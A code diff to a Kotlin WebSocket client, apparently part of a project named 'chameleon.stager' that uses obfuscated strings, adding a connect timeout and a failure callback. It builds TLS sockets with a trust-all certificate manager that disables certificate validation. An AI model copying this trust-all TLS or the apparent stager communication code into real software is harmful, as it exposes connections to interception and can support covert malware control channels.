@@ -5,16 +5,17 @@ import com.chameleon.stager.utils.ObfuscatedStrings
 import java.io.BufferedReader
 import java.io.InputStreamReader
 import java.io.OutputStreamWriter
+import java.net.InetSocketAddress
 import java.net.Socket
 import java.security.SecureRandom
 import javax.net.ssl.SSLContext
-import javax.net.ssl.SSLSocketFactory
 import javax.net.ssl.TrustManager
 import javax.net.ssl.X509TrustManager
 
 class WebSocketClient(private val url: String) {
     companion object {
         const val TAG = "WSClient"
+        private const val CONNECT_TIMEOUT_MS = 10000
     }
 
     private var socket: Socket? = null
@@ -23,10 +24,12 @@ class WebSocketClient(private val url: String) {
     private var isConnected = false
     private var onMessageCallback: ((String) -> Unit)? = null
     private var onConnectedCallback: (() -> Unit)? = null
+    private var onFailureCallback: ((Exception) -> Unit)? = null
 
-    fun connect(onMessage: (String) -> Unit, onConnected: () -> Unit) {
+    fun connect(onMessage: (String) -> Unit, onConnected: () -> Unit, onFailure: (Exception) -> Unit = {}) {
         onMessageCallback = onMessage
         onConnectedCallback = onConnected
+        onFailureCallback = onFailure
         Thread { doConnect() }.start()
     }
 
@@ -43,7 +46,7 @@ class WebSocketClient(private val url: String) {
             socket = if (isTls) {
                 createTlsSocket(host, port)
             } else {
-                Socket(host, port)
+                Socket().apply { connect(InetSocketAddress(host, port), CONNECT_TIMEOUT_MS) }
             }
 
             socket?.let { sock ->
@@ -60,6 +63,7 @@ class WebSocketClient(private val url: String) {
         } catch (e: Exception) {
             Log.e(TAG, "Connection failed", e)
             isConnected = false
+            onFailureCallback?.invoke(e)
         }
     }
 
@@ -72,8 +76,9 @@ class WebSocketClient(private val url: String) {
 
         val sslContext = SSLContext.getInstance("TLS")
         sslContext.init(null, trustAllCerts, SecureRandom())
-        val factory = sslContext.socketFactory
-        return factory.createSocket(host, port)
+        val plain = Socket()
+        plain.connect(InetSocketAddress(host, port), CONNECT_TIMEOUT_MS)
+        return sslContext.socketFactory.createSocket(plain, host, port, true)
     }
 
     private fun performHandshake(host: String, port: Int, path: String) {
